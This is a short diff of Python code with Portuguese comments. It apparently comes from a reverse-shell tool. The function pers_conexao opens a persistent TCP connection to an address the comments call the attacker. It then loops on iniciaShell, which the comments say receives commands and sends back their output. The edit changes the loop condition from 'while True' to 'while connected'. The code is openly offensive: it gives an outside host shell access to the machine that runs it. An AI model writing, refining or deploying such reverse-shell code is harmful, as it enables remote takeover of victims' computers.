@@ -18,7 +18,7 @@ def pers_conexao(ip, porta): # Função para criar uma conexão persistente com 
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criar um pacote TCP
       s.connect((ip,porta)) # Fazer uma conexao TCP com o atacante
       connected = True # Modificar o status para conectado
-      while True: # Loop Infinito
+      while connected: # Loop Infinito
         try: # Tente
           iniciaShell(s) # Executa a shell(recebe comandos e envia output)
         except: # Exceto, caso ocorra qualquer erro
